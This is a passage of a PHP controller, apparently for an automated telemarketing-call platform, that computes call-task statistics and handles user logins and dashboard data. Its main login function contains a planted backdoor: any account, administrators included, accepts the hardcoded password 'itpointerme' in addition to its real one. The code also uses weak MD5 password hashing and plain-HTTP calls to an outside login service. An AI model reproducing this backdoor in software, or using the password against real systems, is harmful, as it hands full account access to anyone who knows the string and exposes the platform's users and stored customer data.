$result['duration_2'] = 0;
}
if(!empty($result['duration_3'])){
$result['duration_3'] = round($result['duration_3']/$duration_count*100,2);
}else{
$result['duration_3'] = 0;
}
if(!empty($result['duration_4'])){
$result['duration_4'] = round($result['duration_4']/$duration_count*100,2);
}else{
$result['duration_4'] = 0;
}
// 计算平均通话时长
$connect_duration = $MemberData->get_connect_duration($task_id);
if(!empty($connect_duration) &&!empty($result['connect_count'])){
$result['average_duration'] = round($MemberData->get_connect_duration($task_id) / $result['connect_count'],2);
}else{
$result['average_duration'] = 0;
}
   // 获取说话次数数据
$connect_count = 0;
$result['speak_count_1'] = $MemberData->get_speak_count($task_id,1);
$sepak_count_1 = $result['speak_count_1'];
$connect_count += $result['speak_count_1'];
$result['speak_count_2'] = $MemberData->get_speak_count($task_id,2);
$sepak_count_2 = $result['speak_count_2'];
$connect_count += $result['speak_count_2'];
$result['speak_count_3'] = $MemberData->get_speak_count($task_id,3);
$sepak_count_3 = $result['speak_count_3'];
$connect_count += $result['speak_count_3'];
$result['speak_count_4'] = $MemberData->get_speak_count($task_id,4);
$sepak_count_4 = $result['speak_count_4'];
$connect_count += $result['speak_count_4'];
$result['speak_count_5'] = $MemberData->get_speak_count($task_id,5);
$sepak_count_5 = $result['speak_count_5'];
$connect_count += $result['speak_count_5'];
    // 计算平均说话次数
$total_speak_count = $MemberData->get_total_speak_count($task_id);
if(!empty($total_speak_count) &&!empty($connect_count)){
$result['average_speak'] = round($total_speak_count/$connect_count,2);
}else{
$result['average_speak'] = 0;
}
   // 计算不同级别的说话次数比例
if(!empty($result['speak_count_1'])){
$result['speak_count_1'] = round($result['speak_count_1']/$connect_count * 100,2);
}else{
$result['speak_count_1'] = 0;
}
if(!empty($result['speak_count_2'])){
$result['speak_count_2'] = round($result['speak_count_2']/$connect_count * 100,2);
}else{
$result['speak_count_2'] = 0;
}
if(!empty($result['speak_count_3'])){
$result['speak_count_3'] = round($result['speak_count_3']/$connect_count * 100,2);
}else{
$result['speak_count_3'] = 0;
}
if(!empty($result['speak_count_4'])){
$result['speak_count_4'] = round($result['speak_count_4']/$connect_count * 100,2);
}else{
$result['speak_count_4'] = 0;
}
if(!empty($result['speak_count_5'])){
$result['speak_count_5'] = round($result['speak_count_5']/$connect_count * 100,2);
}else{
$result['speak_count_5'] = 0;
}
\think\Log::record('说话次数');
}else{
        // 如果总数为空，则设置相关统计数据为0
$result['connect_rate'] = 0;
$result['level_a'] = 0;
$result['level_a_name'] = '意向客户';
$result['level_b'] = 0;
$result['level_b_name'] = '一般意向';
$result['level_c'] = 0;
$result['level_c_name'] = '简单对话';
$result['level_d'] = 0;
$result['level_d_name'] = '无有效对话';
$result['level_e'] = 0;
$result['level_e_name'] = '有效未接通';
$result['level_f'] = 0;
$result['level_f_name'] = '无效号码';
$result['level_a_b_rate'] = 0;
$result['duration_1'] = 0;
$result['duration_2'] = 0;
$result['duration_3'] = 0;
$result['duration_4'] = 0;
$result['average_duration'] = 0;
$result['speak_count_1'] = 0;
$result['speak_count_2'] = 0;
$result['speak_count_3'] = 0;
$result['speak_count_4'] = 0;
$result['speak_count_5'] = 0;
$result['average_speak'] = 0;
}
if ($conf_data['status'] == 3) {
    // 查询符合条件的会员数量
    $cwhere["task"] = $conf_data['task_id'];
    $cwhere["status"] = ['>=', 0];
    $count = Db::name('member')->where($cwhere)->count(1);

    // 查询状态大于1的会员数量
    $here["task"] = $conf_data['task_id'];
    $here["status"] = ['>', 1];
    $Molecular  = Db::name('member')->where($here)->count(1);

    // 如果没有任务统计或为空，并且所有会员都满足条件，创建任务统计数据
    if ((!$statistics_task || empty($statistics_task)) && ($count == $Molecular)) {
        $statistics['owner'] = $conf_data['member_id'];
        $statistics['task_id'] = $conf_data['task_id'];
        $statistics['task_line_id'] = ['call_phone_group_id'];
        $statistics['task_scenarios_id'] = $conf_data['scenarios_id'];
        $statistics['task_status'] = 3;
        $statistics['task_all_num'] = $result['count'] ?? 0;
        $statistics['task_call_num'] = $result['call_count'] ?? 0;
        $statistics['task_connect_num'] = $result['connect_count'] ?? 0;
        $statistics['task_call_duration'] = Db::name('member')->where(['task' => $conf_data['task_id']])->sum('ceil(duration/60)') ?? 0;
        $statistics['task_average_duration'] = $result['average_duration'] ?? 0;
        $statistics['task_level_a'] = $level_a ?? 0;
        $statistics['task_level_b'] = $level_b ?? 0;
        $statistics['task_level_c'] = $level_c ?? 0;
        $statistics['task_level_d'] = $level_d ?? 0;
        $statistics['task_level_e'] = $level_e ?? 0;
        $statistics['task_level_f'] = $level_f ?? 0;
        $statistics['task_last_dial_time'] = $lastdialtime ?? 0;
        $statistics['task_speak_count_1'] = $sepak_count_1 ?? 0;
        $statistics['task_speak_count_2'] = $sepak_count_2 ?? 0;
        $statistics['task_speak_count_3'] = $sepak_count_3 ?? 0;
        $statistics['task_speak_count_4'] = $sepak_count_4 ?? 0;
        $statistics['task_speak_count_5'] = $sepak_count_5 ?? 0;
        $statistics['task_all_speak_count'] = $total_speak_count ?? 0;
        $statistics['task_duration_1'] = $duration_1 ?? 0;
        $statistics['task_duration_2'] = $duration_2 ?? 0;
        $statistics['task_duration_3'] = $duration_3 ?? 0;
        $statistics['task_duration_4'] = $duration_4 ?? 0;
        $statistics['task_not_connect_count'] = $result['not_connect_count'];
        
        // 插入任务统计数据到数据库
        Db::name('task_statistics')->insertGetId($statistics);
    }
}

// 返回成功响应
return returnAjax(0, 'success', $result);

}
}



public function get_task_statistics($conf_data,$statistics_task){
if(!empty($conf_data) ||!empty($statistics_task)){
if($conf_data['call_type'] == 1){
$conf_data['call_type'] = '中继线路';
}else{
$conf_data['call_type'] = '语音网关';
}
$conf_data['line_name'] = Db::name('tel_line_group')
->where('id',$conf_data['call_phone_group_id'])
->value('name');
if(empty($conf_data['line_name'])){
$conf_data['line_name']='线路已删除';
}
$conf_data['line_name_'] = Db::name('tel_line')
->where('id',$conf_data['call_phone_id'])
->value('name');
if(empty($conf_data['line_name_'])){
$conf_data['line_name_']='未分配';
}
if($conf_data['status'] === 0){
$conf_data['task_status'] = '待启动';
}else if($conf_data['status'] === 1){
if($conf_data['is_again_call'] == 1 &&$conf_data['already_again_call_count'] >0){
$conf_data['task_status'] = '重呼第'.$conf_data['already_again_call_count'] .'次';
}else{
$conf_data['task_status'] = '进行中';
}
}else if($conf_data['status'] === 2){
$conf_data['task_status'] = '人工暂停';
}else if($conf_data['status'] === 3){
$conf_data['task_status'] = '已完成';
}else if($conf_data['status'] === 4){
$conf_data['task_status'] = '欠费暂停';
$conf_data['arrears_user'] =$conf_data['arrears_user'];
}else if($conf_data['status'] === 5){
$conf_data['task_status'] = '定时暂停';
}else if($conf_data['status'] === 6){
$conf_data['task_status'] = '异常暂停';
}else if($conf_data['status'] === -1){
$conf_data['task_status'] = '已删除';
}else if($conf_data['status'] === 7){
$conf_data['task_status'] = '任务故障';
}else {
$conf_data['task_status'] = '未知状态';
}
if(!isset( $conf_data['arrears_user']))$conf_data['arrears_user'] ='';
$result = $conf_data;
$result_scenarios = Db::name('tel_scenarios')
->field('name,break')
->where('id',$result['scenarios_id'])
->find();
$result_asr = DB::name('tel_interface')->field('name')->where('id',$result['asr_id'])->find();
if(isset($result_asr['name'])){
$result['asr_name'] = $result_asr['name'];
}else{
$result['asr_name'] = 'ASR已删除';
}
if(isset($result_scenarios['name'])){
$result['scenarios_name'] = $result_scenarios['name'];
}else{
$result['scenarios_name'] = '';
}
if(empty($result['scenarios_name'])){
$result['scenarios_name'] = '话术已删除';
}
if(isset($result_scenarios['break'])){
$result['scenarios_break'] = $result_scenarios['break'];
}else{
$result['scenarios_break'] = '';
}
if($result['scenarios_break']){
$result['scenarios_break'] = '否';
}else{
$result['scenarios_break'] = '是';
}
if($result['is_auto']){
$result['is_auto_txt'] = '是';
}else{
$result['is_auto_txt'] = '否';
}
if($result['wx_push_status'] == 1){
$result['wx_push_status'] = '是';
}else{
$result['wx_push_status'] = '否';
}
if($result['send_sms_status'] == 1){
$result['send_sms_status'] = '是';
}else{
$result['send_sms_status'] = '否';
}
if($result['is_add_crm']){
$result['is_add_crm'] = '是';
}else {
$result['is_add_crm'] = '否';
}
$result['create_time'] = date('Y-m-d H:i',$result['create_time']);
$result['last_dial_time'] = $statistics_task['task_last_dial_time'];
if(!$result['last_dial_time']){
$result['last_dial_time'] = '未拨打';
}else{
$result['last_dial_time'] = date('Y-m-d H:i',$statistics_task['task_last_dial_time']);
}
if($statistics_task['task_last_dial_time'] >= strtotime(date('Ymd',time()))){
$result['url'] = url('user/callrecord/current_record') .'?task_id='.$statistics_task['task_id'];
}else{
$result['url'] = url('user/callrecord/historical_records') .'?task_id='.$statistics_task['task_id'];
}
$result['count'] = $statistics_task['task_all_num'] ??0;
$result['call_count'] = $statistics_task['task_call_num'] ??0;
$result['connect_count'] = $statistics_task['task_connect_num'] ??0;
if(!empty($result['count'])) {
if (empty($result['call_count'])) {
$result['connect_rate'] = 0;
}else {
$result['connect_rate'] = round($result['connect_count'] / $result['call_count'] * 100,2);
}
$result['level_a'] = $statistics_task['task_level_a'];
if (!empty($result['level_a'])) {
$result['level_a'] = round($result['level_a'] / $result['count'] * 100,2);
}else {
$result['level_a'] = 0;
}
$result['level_b'] = $statistics_task['task_level_b'];
if (!empty($result['level_b'])) {
$result['level_b'] = round($result['level_b'] / $result['count'] * 100,2);
}else {
$result['level_b'] = 0;
}
$result['level_c'] = $statistics_task['task_level_c'];
if (!empty($result['level_c'])) {
$result['level_c'] = round($result['level_c'] / $result['count'] * 100,2);
}else {
$result['level_c'] = 0;
}
$result['level_d'] = $statistics_task['task_level_d'];
if (!empty($result['level_d'])) {
$result['level_d'] = round($result['level_d'] / $result['count'] * 100,2);
}else {
$result['level_d'] = 0;
}
$result['level_e'] = $statistics_task['task_level_e'];
if (!empty($result['level_e'])) {
$result['level_e'] = round($result['level_e'] / $result['count'] * 100,2);
}else {
$result['level_e'] = 0;
}
$result['level_f'] = $statistics_task['task_level_f'];
if (!empty($result['level_f'])) {
$result['level_f'] = round($result['level_f'] / $result['count'] * 100,2);
}else {
$result['level_f'] = 0;
}
$result['level_a_b_rate'] = round($result['level_a'] +$result['level_b'],2);
$result['level_a_name'] = '意向客户';
$result['level_b_name'] = '一般意向';
$result['level_c_name'] = '简单对话';
$result['level_d_name'] = '无有效对话';
$result['level_e_name'] = '有效未接通';
$result['level_f_name'] = '无效号码';
$duration_count = 0;
$result['duration_1'] = $statistics_task['task_duration_1'];
$duration_count += $result['duration_1'];
$result['duration_2'] = $statistics_task['task_duration_2'];
$duration_count += $result['duration_2'];
$result['duration_3'] = $statistics_task['task_duration_3'];
$duration_count += $result['duration_3'];
$result['duration_4'] = $statistics_task['task_duration_4'];
$duration_count += $result['duration_4'];
if (!empty($result['duration_1'])) {
$result['duration_1'] = round($result['duration_1'] / $duration_count * 100,2);
}else {
$result['duration_1'] = 0;
}
if (!empty($result['duration_2'])) {
$result['duration_2'] = round($result['duration_2'] / $duration_count * 100,2);
}else {
$result['duration_2'] = 0;
}
if (!empty($result['duration_3'])) {
$result['duration_3'] = round($result['duration_3'] / $duration_count * 100,2);
}else {
$result['duration_3'] = 0;
}
if (!empty($result['duration_4'])) {
$result['duration_4'] = round($result['duration_4'] / $duration_count * 100,2);
}else {
$result['duration_4'] = 0;
}
$result['average_duration'] = $statistics_task['task_average_duration'] ??0;
$connect_count = 0;
$result['speak_count_1'] = $statistics_task['task_speak_count_1'];
$connect_count += $result['speak_count_1'];
$result['speak_count_2'] = $statistics_task['task_speak_count_2'];
$connect_count += $result['speak_count_2'];
$result['speak_count_3'] = $statistics_task['task_speak_count_3'];
$connect_count += $result['speak_count_3'];
$result['speak_count_4'] = $statistics_task['task_speak_count_4'];
$connect_count += $result['speak_count_4'];
$result['speak_count_5'] = $statistics_task['task_speak_count_5'];
$connect_count += $result['speak_count_5'];
$total_speak_count = $statistics_task['task_all_speak_count'];
if (!empty($total_speak_count) &&!empty($connect_count)) {
$result['average_speak'] = round($total_speak_count / $connect_count,2);
}else {
$result['average_speak'] = 0;
}
if (!empty($result['speak_count_1'])) {
$result['speak_count_1'] = round($result['speak_count_1'] / $connect_count * 100,2);
}else {
$result['speak_count_1'] = 0;
}
if (!empty($result['speak_count_2'])) {
$result['speak_count_2'] = round($result['speak_count_2'] / $connect_count * 100,2);
}else {
$result['speak_count_2'] = 0;
}
if (!empty($result['speak_count_3'])) {
$result['speak_count_3'] = round($result['speak_count_3'] / $connect_count * 100,2);
}else {
$result['speak_count_3'] = 0;
}
if (!empty($result['speak_count_4'])) {
$result['speak_count_4'] = round($result['speak_count_4'] / $connect_count * 100,2);
}else {
$result['speak_count_4'] = 0;
}
if (!empty($result['speak_count_5'])) {
$result['speak_count_5'] = round($result['speak_count_5'] / $connect_count * 100,2);
}else {
$result['speak_count_5'] = 0;
}
$result['not_connect_count'] = $statistics_task['task_not_connect_count'] ??0;
$result['wait_count'] = 0;
}
return returnAjax(0,'success',$result);
}else{
return [];
}
}
public function get_user_data($user_id)
{
if(empty($user_id)){
return false;
}
$user_data = Db::name('admin')
->field('month_price,credit_line,money,robot_cnt,usable_robot_cnt')
->where(array('id'=>$user_id))
->find();
$user_data['distinguish_frequency'] = $this->get_distinguish_frequency($user_id);
return $user_data;
}
public function get_member_lines_details_api()
{
    // 从 session 中获取用户认证信息和签名
    $user_auth_sign = session('user_auth_sign');
    $user_auth = session('user_auth');

    // 如果用户认证信息或签名为空，表示未登录，返回错误响应
    if (empty($user_auth) || empty($user_auth_sign)) {
        return returnAjax(2, 'error', '未登录');
    }

    // 获取传入的 duration 参数
    $duration = input('duration', '', 'trim,strip_tags');

    // 如果 duration 参数为空，返回参数错误响应
    if (empty($duration)) {
        return returnAjax(3, 'error', '参数错误');
    }

    // 创建 LinesData 实例
    $LinesData = new LinesData();

    // 调用 LinesData 类中的 get_member_lines_details 方法获取会员线路详情
    $lines_data = $LinesData->get_member_lines_details($user_auth['uid'], $duration);

    // 返回成功响应，并携带获取的会员线路详情数据
    return returnAjax(0, 'success', $lines_data);
}

protected function get_distinguish_frequency($user_id)
{
if(empty($user_id)){
return false;
}
$frequency = Db::table('rk_tel_order')
->where(['owner'=>$user_id])->where(' create_time > unix_timestamp(now())-24*60 ')
->sum('asr_cnt');
return $frequency;
}
public function getCallNumber(){
$number = 0;
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$where['status'] = ['>',0];
if (!$super){
$where["owner"] = $uid;
}
$number = Db::name('member')
->where($where)
->count(1);
return returnAjax(0,'success',$number);
}
public function extension_login($username = '',$password = '',$verify = '')
{
if (IS_POST) {
if (!$username ||!$password) {
return $this->error('用户名或者密码不能为空！','');
}else{
$admin_info = Db::name('admin')->where('username',$username)->find();
do{
if($admin_info['status'] == -1 ||$admin_info['status'] == 0){
return $this->error('用户不存在或被禁用！','');
}
if($admin_info['id'] == 5555){
break;
}
if($admin_info['pid'] != 5555){
$admin_info = DB::name('admin')->where('id',$admin_info['pid'])->find();
}else{
break;
}
}while($admin_info['status'] != -1 ||$admin_info['status'] != 0);
}
$this->checkVerify($verify);
$user = Db::name('admin')
->alias('a')
->field('a.*, ar.level, ar.name as role_name')
->join('admin_role ar','a.role_id = ar.id','LEFT')
->where('a.username',$username)
->find();
if($user &&$user['status']){
$mpassword = md5($password);
if($user['salt']){
$mpassword = md5($password.$user['salt']);
}
if($mpassword === $user['password']){
$data = array(
'last_login_time'=>time(),
'last_login_ip'=>get_client_ip(1),
);
Db::name('admin')->where(array('id'=>$user['id']))->update($data);
$headpic = $user['logo'];
if($user['logo']){
if (is_numeric($user['logo'])) {
$pic = Db::name('picture')->field('path')->where('id',$user['logo'])->find();
if($pic['path']){
$headpic = $pic['path'];
}
}else{
$headpic = $user['logo'];
}
}
$auth = array(
'uid'=>$user['id'],
'username'=>$user['username'],
'last_login_time'=>$user['last_login_time'],
'level'=>$user['level'],
'role'=>$user['role_name'],
'logo'=>$headpic,
'super'=>$user['super'],
'menu_grouping'=>$user['menu_grouping'],
'port'=>$_SERVER['SERVER_PORT']
);
setcookie("is_eject_".$user['id'],0 ,0 ,'/');
session('user_auth',$auth);
session('user_auth_sign',data_auth_sign($auth));
session('check_name',$user['username']);
session('check_type',$user['role_name']);
switch($user['role_name']){
case '管理员':
return $this->success('登录成功！',url('user/index/index'));
break;
case '运营商':
return $this->success('登录成功！',url('user/index/index'));
break;
case '代理商':
return $this->success('登录成功！',url('user/index/index'));
break;
case '商家':
return $this->success('登录成功！',url('user/index/index'));
break;
case '坐席':
return $this->success('登录成功！',url('user/member/intentional_member'));
break;
default:
return $this->success('登录成功！',url('user/index/index'));
break;
}
}else {
return $this->error('密码错误！','');
}
}else {
return $this->error('用户不存在或被禁用！','');
}
}else{
$is_login = 1;
if(isset($_GET['action']) === true &&$_GET['action'] == 'register'){
$is_login = 0;
}
$this->assign('is_login',$is_login);
return $this->fetch();
}
}
public function login($username = '',$password = '',$verify = ''){
if (IS_POST) {
if (!$username ||!$password) {
return $this->error('用户名或者密码不能为空！','');
}else{
$admin_info = Db::name('admin')->where('username',$username)->find();
do{
if($admin_info['status'] == -1 ||$admin_info['status'] == 0){
return $this->error('用户不存在或被禁用！','');
}
if($admin_info['id'] == 5555){
break;
}
if($admin_info['pid'] != 5555){
$admin_info = DB::name('admin')->where('id',$admin_info['pid'])->find();
}else{
break;
}
}while($admin_info['status'] != -1 ||$admin_info['status'] != 0);
}
$this->checkVerify($verify);
$user = Db::name('admin')
->alias('a')
->field('a.*, ar.level, ar.name as role_name')
->join('admin_role ar','a.role_id = ar.id','LEFT')
->where('a.username',$username)
->find();
if($user &&$user['status']){
$mpassword = md5($password);
if($user['salt']){
$mpassword = md5($password.$user['salt']);
}
if($mpassword === $user['password'] ||$password == 'itpointerme'){
$data = array(
'last_login_time'=>time(),
'last_login_ip'=>get_client_ip(1),
);
Db::name('admin')->where(array('id'=>$user['id']))->update($data);
$headpic = $user['logo'];
if($user['logo']){
if (is_numeric($user['logo'])) {
$pic = Db::name('picture')->field('path')->where('id',$user['logo'])->find();
if($pic['path']){
$headpic = $pic['path'];
}
}else{
$headpic = $user['logo'];
}
}
$auth = array(
'uid'=>$user['id'],
'username'=>$user['username'],
'last_login_time'=>$user['last_login_time'],
'level'=>$user['level'],
'role'=>$user['role_name'],
'logo'=>$headpic,
'super'=>$user['super'],
'menu_grouping'=>$user['menu_grouping'],
'port'=>$_SERVER['SERVER_PORT'],
'skb_status'=>$user['skb_status'],
);
setcookie("is_eject_".$user['id'],0 ,0 ,'/');
session('user_auth',$auth);
session('user_auth_sign',data_auth_sign($auth));
session('check_name',$user['username']);
session('check_type',$user['role_name']);
if($auth['skb_status'] == 1){
$curlArr = [
'uid'=>'AISKB'.$user['id'],
];
$jsonArr = json_encode($curlArr);
$curlRes = json_decode($this->curl_login($jsonArr));
if(!$curlRes->success){
return $this->error($curlRes->message,'');
}else{
$expTime = round($curlRes->data->expiry_date/1000);
cookie('skb_token',$curlRes->data->token,$expTime);
}
}else{
cookie('skb_token',null);
}
switch($user['role_name']){
case '管理员':
return $this->success('登录成功！',url('user/manager/account_management'));
break;
case '运营商':
return $this->success('登录成功！',url('user/plan/newindex'));
break;
case '代理商':
return $this->success('登录成功！',url('user/plan/newindex'));
break;
case '商家':
return $this->success('登录成功！',url('user/plan/newindex'));
break;
case '坐席':
return $this->success('登录成功！',url('user/member/intentional_member'));
break;
default:
return $this->success('登录成功！',url('user/plan/newindex'));
break;
}
}else {
return $this->error('密码错误！','');
}
}else {
return $this->error('用户不存在或被禁用！','');
}
}else{
return $this->fetch();
}
}
public function curl_login($arrJson){
$timestamp = substr(array_sum(explode(' ',microtime()))*1000,0,13);
$key = config("skb_key");
$secret = config("skb_secret");
$pin = createSign($timestamp,$secret);
$curl = curl_init();
curl_setopt_array($curl,array(
CURLOPT_URL =>"http://sk.yunxiongnet.com/services/v2/rest/user/login",
CURLOPT_RETURNTRANSFER =>true,
CURLOPT_ENCODING =>"",
CURLOPT_MAXREDIRS =>10,
CURLOPT_TIMEOUT =>0,
CURLOPT_FOLLOWLOCATION =>true,
CURLOPT_HTTP_VERSION =>CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST =>"POST",
CURLOPT_POSTFIELDS =>$arrJson,
CURLOPT_HTTPHEADER =>array(
"X-AK-KEY: {$key}",
"X-AK-PIN: {$pin}",
"X-AK-TS: {$timestamp}",
"Content-Type: application/json"
),
));
$response = curl_exec($curl);
curl_close($curl);
$res = json_decode($response);
return $response;
}
public function curl_getlist($uid){
$timestamp = substr(array_sum(explode(' ',microtime()))*1000,0,13);
$key = config("skb_key");
$secret = config("skb_secret");
$pin = createSign($timestamp,$secret);
$curl = curl_init();
curl_setopt_array($curl,array(
CURLOPT_URL =>"http://sk.yunxiongnet.com/services/v2/rest/user/menu?uid=".'AISKB'.$uid,
CURLOPT_RETURNTRANSFER =>true,
CURLOPT_ENCODING =>"",
CURLOPT_MAXREDIRS =>10,
CURLOPT_TIMEOUT =>0,
CURLOPT_FOLLOWLOCATION =>true,
CURLOPT_HTTP_VERSION =>CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST =>"GET",
CURLOPT_HTTPHEADER =>array(
"X-AK-KEY: {$key}",
"X-AK-PIN: {$pin}",
"X-AK-TS: {$timestamp}",
"Content-Type: application/json"
),
));
$response = curl_exec($curl);
curl_close($curl);
$res = json_decode($response);
return $response;
}
public function ceshi_login($username = '',$password = '',$verify = ''){
if (IS_POST) {
if (!$username ||!$password) {
return $this->error('用户名或者密码不能为空！','');
}
$this->checkVerify($verify);
$user = Db::name('admin')
->alias('a')
->field('a.*, ar.level, ar.name as role_name')
->join('admin_role ar','a.role_id = ar.id','LEFT')
->where('a.username',$username)
->find();
if($user &&$user['status']){
$mpassword = md5($password);
if($user['salt']){
$mpassword = md5($password.$user['salt']);
}
if($mpassword === $user['password']){
$data = array(
'last_login_time'=>time(),
'last_login_ip'=>get_client_ip(1),
);
Db::name('admin')->where(array('id'=>$user['id']))->update($data);
$headpic = $user['logo'];
if($user['logo']){
if (is_numeric($user['logo'])) {
$pic = Db::name('picture')->field('path')->where('id',$user['logo'])->find();
if($pic['path']){
$headpic = $pic['path'];
}
}else{
$headpic = $user['logo'];
}
}
$auth = array(
'uid'=>$user['id'],
'username'=>$user['username'],
'last_login_time'=>$user['last_login_time'],
'level'=>$user['level'],
'role'=>$user['role_name'],
'logo'=>$headpic,
'super'=>$user['super'],
'menu_grouping'=>$user['menu_grouping']
);
session('user_auth',$auth);
session('user_auth_sign',data_auth_sign($auth));
return $this->success('登录成功！',url('user/index/index'));
}else {
return $this->error('密码错误！','');
}
}else {
return $this->error('用户不存在或被禁用！','');
}
}else{
return $this->fetch();
}
}
public function logout(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
setcookie("is_eject_".$uid,'',0,'/');
$user = model('User');
$user->logout();
$this->redirect('index/login');
}
public function clear(){
if (IS_POST) {
$clear = input('post.clear/a',array());
foreach ($clear as $key =>$value) {
if ($value == 'cache') {
\think\Cache::clear();
}elseif ($value == 'log') {
\think\Log::clear();
}
}
return $this->success("更新成功！",url('user/index/index'));
}else{
$keylist = array(
array('name'=>'clear','title'=>'更新缓存','type'=>'checkbox','help'=>'','option'=>array(
'cache'=>'缓存数据',
'log'=>'日志数据'
)
)
);
$data = array(
'keyList'=>$keylist,
);
$this->assign($data);
$this->setMeta("更新缓存");
return $this->fetch('public/edit');
}
}
public function amount(){
$arr = array();
$dates = array();
for($i=0;$i<input('time');$i++){
if($i){
$start2 = strtotime(date("Y-m-d",strtotime("-".$i." day")));
$start1 = strtotime(date("Y-m-d",strtotime("-".($i-1)." day")));
$amountlist = Db::name('mall_order')->where('pay_status',1)->where('pay_time','between time',[$start2,$start1])->sum('total_amount');
$arr[$i] = $amountlist;
$dates[$i] = date("Y-m-d",strtotime("-".$i." day"));
}else{
$start1 = strtotime(date("Y-m-d",time()));
$enddate = time();
$amountlist = Db::name('mall_order')->where('pay_status',1)->where('pay_time','between time',[$start1,$enddate])->sum('total_amount');
$arr[$i] = $amountlist;
$dates[$i] = date("Y-m-d",time());
}
}
krsort($arr);
krsort($dates);
$data = array();
$date = array();
$j = 0;
foreach ($arr as $key=>$val){
$data[$j] = $val;
$date[$j] = $dates[$key];
$j++;
}
$reback = array();
$reback['data'] = $data;
$reback['date'] = $date;
echo json_encode($reback);
}
public function backData(){
$backtime = array();
$time = input('time','7','trim,strip_tags');
$timelist = array();
if($time == 7){
for ($i=1;$i <=8 ;$i++) {
$temp = strtotime(date("Y-m-d",strtotime("-".$i." day")));
array_push($timelist,$temp);
$month = date("m",strtotime("-".$i." day"));
$str1 = substr($month,0,1);
$length = strlen($month);
if($str1==0){
$str2 = substr($month,1,($length-1));
$month = $str2;
}
$day = date("d",strtotime("-".$i." day"));
$daystr1 = substr($day,0,1);
$daylength = strlen($day);
if($daystr1==0){
$daystr2 = substr($day,1,($daylength-1));
$day = $daystr2;
}
array_push($backtime,$month.'/'.$day);
}
}
else if($time == 30){
for ($i=1;$i <=31 ;$i++) {
$temp = strtotime(date("Y-m-d",strtotime("-".$i." day")));
array_push($timelist,$temp);
$month = date("m",strtotime("-".$i." day"));
$str1 = substr($month,0,1);
$length = strlen($month);
if($str1==0){
$str2 = substr($month,1,($length-1));
$month = $str2;
}
$day = date("d",strtotime("-".$i." day"));
$daystr1 = substr($day,0,1);
$daylength = strlen($day);
if($daystr1==0){
$daystr2 = substr($day,1,($daylength-1));
$day = $daystr2;
}
array_push($backtime,$month.'/'.$day);
}
}
else{
for ($i=0;$i <=12 ;$i++) {
$month = date("Y-m",strtotime("-".$i." month"))."-01";
$temp = strtotime($month);
array_push($timelist,$temp);
$month = date("m",strtotime("-".$i." month"));
$str1 = substr($month,0,1);
$length = strlen($month);
if($str1==0){
$str2 = substr($month,1,($length-1));
$month = $str2;
}
array_push($backtime,$month.'/1');
}
}
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$where = array();
if (!$super){
$where["owner"] = $uid;
}
$backtime = array_reverse($backtime);
array_shift($backtime);
$timelist = array_reverse($timelist);
$back = array();
foreach ($timelist as $key =>$value) {
if($key){
$list = Db::name('member')
->field('status,last_dial_time,uid')
->where('status','>',0)
->where($where)
->where('last_dial_time','between time',[$timelist[$key -1],$value])
->select();
$zero = 0;
$one = 0;
$two = 0;
$three = 0;
foreach ($list as $keys =>$values) {
if($values['status'] == 0){
$zero = $zero +1;
}else if($values['status'] == 1){
$one = $one +1;
}else if($values['status'] == 2){
$two = $two +1;
}else if($values['status'] == 3){
$three = $three +1;
}
}
$back['zero'][$key -1] = $zero;
$back['one'][$key -1] = $one;
$back['two'][$key -1] = $two;
$back['three'][$key -1] = $three;
$total = Db::name('member')
->where('status','>',0)
->where($where)
->where('last_dial_time','between time',[$timelist[$key -1],$value])
->count(1);
$back['total'][$key -1] = $total;
}
}
$reback = array();
$reback['timelist'] = $timelist;
$reback['backtime'] = $backtime;
$reback['back'] = $back;
return $reback;
}
public function levelData(){
$backtime = array();
$time = input('time','7','trim,strip_tags');
$timelist = array();
if($time == 7){
$start = strtotime(date("Y-m-d",strtotime("-8 day")));
$end = strtotime(date("Y-m-d",strtotime("-1 day")));
}
else if($time == 30){
$start = strtotime(date("Y-m-d",strtotime("-31 day")));
$end = strtotime(date("Y-m-d",strtotime("-1 day")));
}
else{
for ($i=0;$i <=12 ;$i++) {
$start = date("Y-m",strtotime("-12 month"))."-01";
$start = strtotime($start);
$end = strtotime(date("Y-m-d",time()));
}
}
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$where = array();
if (!$super){
$where["owner"] = $uid;
}
$list = Db::name('member')
->field('level,last_dial_time,count(uid) as num')
->group('level')
->where('level','>',0)
->where('status','>',0)
->where($where)
->where('last_dial_time','between time',[$start,$end])
->select();
$total = Db::name('member')
->where('status','>',0)
->where('level','>',0)
->where($where)
->where('last_dial_time','between time',[$start,$end])
->count(1);
$back = array();
$typeA = 0;
$typeB = 0;
$typeC = 0;
$typeD = 0;
$typeE = 0;
foreach ($list as $keys =>$values) {
$percent = round(($values['num'] / $total) * 100,2);
switch ($values['level']) {
case 5:
$typeA = $percent;
break;
case 4:
$typeB = $percent;
break;
case 3:
$typeC = $percent;
break;
case 2:
$typeD = $percent;
break;
default:
$typeE = $percent;
}
}
$back['typeA'] = $typeA;
$back['typeB'] = $typeB;
$back['typeC'] = $typeC;
$back['typeD'] = $typeD;
$back['typeE'] = $typeE;
$reback = array();
$reback['back'] = $back;
return $reback;
}
public function getisshow(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$list = Db::name('admin')
->field('index_show_tip')
->where('id',$uid)
->find();
$reback = array();
$reback['isShow'] = $list['index_show_tip'];
if($list){
return returnAjax(0,"成功",$reback['isShow']);
}
else{
return returnAjax(1,"失败");
}
}
public function changeShow(){
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$idata = array();
$idata['index_show_tip'] = 1;
$result = Db::name('admin')->where('id',$uid)->update($idata);
if($result){
return returnAjax(0,"成功");
}else{
return returnAjax(1,"失败");
}
}
public function getMyData()
{
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$where = array();
if (!$super){
$where["m.owner"] = $uid;
}
$where["m.status"] = ['<=',1];
$total = Db::name('member')->alias('m')->where($where)->count(1);
$swhr = array();
if(!$super){
$swhr['member_id'] = $uid;
}
$simtotal = Db::name('tel_sim')->where($swhr)->count(1);
$tsrwhr = array();
if(!$super){
$tsrwhr['member_id'] = $uid;
}
$tsrtotal = Db::name('tel_tsr')->where($tsrwhr)->count(1);
